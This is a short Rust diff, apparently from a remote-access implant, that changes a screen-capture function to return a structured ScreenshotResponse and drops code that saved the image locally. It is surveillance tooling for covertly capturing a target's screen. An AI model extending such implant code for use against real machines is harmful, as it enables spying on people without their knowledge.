@@ -5,8 +5,9 @@ use std::thread;
 use std::time::Duration;
 
 use crate::errors::ImplantError;
+use crate::models::screenshot;
 
-pub fn take_screenshot() -> Result<Vec<u8>, ImplantError> {
+pub fn take_screenshot() -> Result<screenshot::ScreenshotResponse, ImplantError> {
     let one_second = Duration::new(1, 0);
     let one_frame = one_second / 60;
 
@@ -40,15 +41,9 @@ pub fn take_screenshot() -> Result<Vec<u8>, ImplantError> {
             }
         }
 
-        // repng::encode(
-        //     File::create("screenshot.png").unwrap(),
-        //     w as u32,
-        //     h as u32,
-        //     &bitflipped,
-        // )
-        // .unwrap();
+        let result = screenshot::ScreenshotResponse::new(bitflipped, w as u32, h as u32);
 
-        break Ok(bitflipped);
+        break Ok(result);
     }
 }
 
